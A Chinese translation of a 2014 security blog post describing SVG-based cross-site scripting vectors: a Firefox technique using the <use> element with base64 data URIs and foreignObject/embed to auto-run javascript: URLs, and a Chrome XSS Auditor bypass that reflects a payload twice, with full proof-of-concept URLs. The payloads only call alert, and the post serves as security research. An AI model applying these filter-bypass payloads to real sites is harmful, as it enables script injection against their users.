# 用SVG来找点乐子

英文原文链接：[http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html](http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html)

0x00 一个新的FF SVG Vector
----------------------

* * *

如果你对SVG没有任何的概念，可能阅读起来会比较吃力。如果你觉得看不懂可以先百度一下SVG是什么，我们都用它在干一些什么。 首先介绍一下SVG里的`<use>`元素：

使用`<use>`结合#来可以引用外部SVG文件中的元素。举个例子来说就是这样：

test.html:

```
<svg> 
<use xlink:href='external.svg#rectangle' /> 
</svg>

```

external.svg:

```
<svg id="rectangle" xmlns="http://www.w3.org/2000/svg" 
xmlns:xlink="http://www.w3.org/1999/xlink" 
width="100" height="100"> 
<a xlink:href="javascript:alert(location)"> 
<rect x="0" y="0" width="100" height="100" /> 
</a> 
</svg>

```

这里需要注意的是这个外部的svg文件需要和引用这个文件的网站同源。这意味着这种方法在XSS的利用上会十分的鸡肋，或者说没有存在的意义。但 是有什么方法可以让它变成一个有用的XSS向量呢？Firefox在这里就可以帮上忙。因为我们都知道我们可以使用data URI的方式在内部创建一个svg文件来调用它。利用代码会像这样

```
<svg> 
<use xlink:href="data:image/svg+xml;base64, PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle" /> 
</svg>

```

我们再进一步看一下这个svg文件base64解码后的样子：

```
<svg id="rectangle" 
xmlns="http://www.w3.org/2000/svg" 
xmlns:xlink="http://www.w3.org/1999/xlink" 
width="100" height="100"> 
<a xlink:href="javascript:alert(location)"> 
<rect x="0" y="0" width="100" height="100" /> 
</a> 
</svg>

```

我们之前也强调过，我们需要做一个有意义的攻击向量。但是这个方法存在一个缺陷，就是需要用户点击我们的rect才会触发。但是很少会有用户去点 击一些莫名其妙的东西。所以我们需要做一个自动触发的vector.但是有一个问题，就是script标签出现在一个外部的svg当中时，并不会被解析。 为了证明这一事实，我会在接下来的POC当中插入一段script。但是值得庆幸的是,svg还支持`<foreignObject>`元素。通 过指定该对象所需的扩展属性，就可以实现对非SVG元素的载入了。这意味着我们现在可以使用iframe embed或一些其它的HTML元素。在这里我选择了embed+javascript URL scheme

现在我们会在内部创建的svg文件看起来会像是这样：

```
<svg id="rectangle" 
xmlns="http://www.w3.org/2000/svg" 
xmlns:xlink="http://www.w3.org/1999/xlink" 
width="100" height="100"> 

<script>alert(1)</script> 

<foreignObject width="100" height="50" 
requiredExtensions="http://www.w3.org/1999/xhtml"> 

<embed xmlns="http://www.w3.org/1999/xhtml" 
src="javascript:alert(location)" /> 

</foreignObject> 
</svg>

```

让我们再用use元素+data URI来在内部创建这个svg文件：

```
<svg> 
<use xlink:href="data:image/svg+xml;base64, PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" /> 
</svg>

```

一个新的FF SVG Vector就这样诞生了。(我用这个方法绕过了某邮箱禁止执行js的限制) **

0x01 绕过chrome XSS Auditor
-------------------------

* * *

我们还是想和前面一样来引入一个外部的SVG文件。但是我们需要一个同源的SVG文件。这意味着data URI在这里是不可行的（chrome下 data URL都是在独立域执行的，SO..）。但是这也难不倒我们，因为我们可以把一个XSS漏洞用两遍来解决这个问题。

测试页面chrome.php

```
<?php 
echo "<body>"; 
echo $_GET['x']; 
echo "</body>"; 
?>

```

POC:

```
http://133.52.240.75/chrome.php? 
x=<svg><use height=200 width=200 
xlink:href='http://133.52.240.75/chrome.php 
?x=<svg id="rectangle" 
xmlns="http://www.w3.org/2000/svg" 
xmlns:xlink="http://www.w3.org/1999/xlink" 
width="100" height="100"> 
<a xlink:href="javascript:alert(location)"> 
<rect class="blue" x="0" y="0" width="100" height="100"/> 
</a></svg>#rectangle'/></svg>

```

当然，不要忘了URL编码！

```
http://133.52.240.75/chrome.php? x=%3Csvg%3E%3Cuse%20height=200%20width=200%20 xlink:href=%27http://133.52.240.75/chrome.php? x=%3Csvg%20id%3D%22rectangle%22%20 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20 %20%20%20width%3D%22100%22%20height%3D%22100%22%3E %3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%28location%29%22%3E %3Crect%20class%3D%22blue%22%20x%3D%220%22%20 y%3D%220%22%20width%3D%22100%22 %20height%3D%22100%22%20%2F%3E %3C%2Fa%3E %3C%2Fsvg%3E%23rectangle%27/%3E%3C/svg%3E

```

have fun!